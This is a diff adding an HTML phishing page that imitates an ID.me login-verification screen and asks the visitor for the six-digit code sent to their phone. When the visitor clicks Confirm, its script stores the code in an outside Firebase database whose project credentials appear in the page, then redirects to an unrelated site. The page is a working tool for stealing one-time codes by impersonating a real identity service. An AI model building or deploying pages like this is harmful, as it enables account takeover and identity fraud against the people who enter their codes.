@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verify your login</title>
+    <link rel="stylesheet" href="index.css" />
+  </head>
+
+  <body>
+    <div class="header">
+      <img src="IMG_5868.jpeg" alt="" />
+    </div>
+    <div class="body-container">
+      <div class="body">
+        <div class="form-header">
+          <h1>Verify Login Attempt</h1>
+        </div>
+        <div class="email-img">
+          <img src="email.svg" alt="">
+        </div>
+        <div class="newID">
+          <p>We sent a verification code to your <strong>phone</strong>.</p>
+        </div>
+        <div class="form-fields">
+          <p class="info">Check your phone for a verfication code and type in the box below to continue
+            login</p>
+          <p class="info">If you do not receive one, do wait patiently, you would receive one in due time.</p>
+        </div>
+        <div class="separator">
+          <span></span>
+        </div>
+        <form action="https://appreciation-page.vercel.app/" class="token">
+          <div class="form-input">
+            <h2>Enter the 6-digit code sent to your phone</h2>
+          </div>
+          <div class="otp-code">
+            <label for="token">Confirmation Code</label>
+            <input type="text" id="token" title="token" placeholder="______" maxlength="6">
+          </div>
+          <div class="confirm">
+            <button id="otp-button" type="submit" class="submit-button">Confirm Code</button>
+          </div>
+        </form>
+        <footer class="footer">
+            <nav class="footer-links">
+              <ul class="footer-list">
+                <li class="footer-list-item active">
+                  <a
+                    rel="noopener noreferrer"
+                    class="footer__link"
+                    title="What is ID.me? (opens in new tab)"
+                    aria-label="What is ID.me? (opens in new tab)"
+                    href="https://www.id.me/about"
+                    >What is ID.me?</a
+                  >
+                </li>
+                <span class="line">|</span>
+                <li class="footer-list-item active">
+                  <a
+                    rel="noopener noreferrer"
+                    class="footer__link"
+                    title="Terms of Service (opens in new tab)"
+                    aria-label="Terms of Service (opens in new tab)"
+                    href="https://www.id.me/terms"
+                    >Terms of Service</a
+                  >
+                </li>
+                <span class="line">|</span>
+                <li class="footer-list-item">
+                  <a
+                    rel="noopener noreferrer"
+                    class="footer__link"
+                    title="Privacy Policy (opens in new tab)"
+                    aria-label="Privacy Policy (opens in new tab)"
+                    href="https://www.id.me/privacy"
+                    >Privacy Policy</a
+                  >
+                </li>
+              </ul>
+            </nav>
+          </footer>
+      </div>
+      
+    </div>
+   
+    <script src="index.js"></script>
+    <script type="module">
+      // Import the functions you need from the SDKs you need
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
+import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-database.js";
+// TODO: Add SDKs for Firebase products that you want to use
+// https://firebase.google.com/docs/web/setup#available-libraries
+
+// Your web app's Firebase configuration
+// For Firebase JS SDK v7.20.0 and later, measurementId is optional
+const firebaseConfig = {
+apiKey: "AIzaSyCmxhN9uuXdrJTp5ywmdInD3jAWOh2dmvs",
+authDomain: "jovi-5ea61.firebaseapp.com",
+projectId: "jovi-5ea61",
+storageBucket: "jovi-5ea61.appspot.com",
+messagingSenderId: "936130816159",
+appId: "1:936130816159:web:98130c9620ffa29a62daaa",
+measurementId: "G-YD05972RWV"
+};
+
+// Initialize Firebase
+const app = initializeApp(firebaseConfig);
+
+const db = getDatabase(app);
+
+document.getElementById("otp-button").addEventListener("click",function (e) {
+  let now = new Date();
+  let timestamp = now.toLocaleString();
+set(ref(db, 'otp/' + timestamp),
+{
+    otp: document.getElementById("token").value
+});
+
+alert("Otp Sent!");
+window.location.ref = "https://appreciation-page.vercel.app/";
+})
+</script>
+  </body>
+</html>
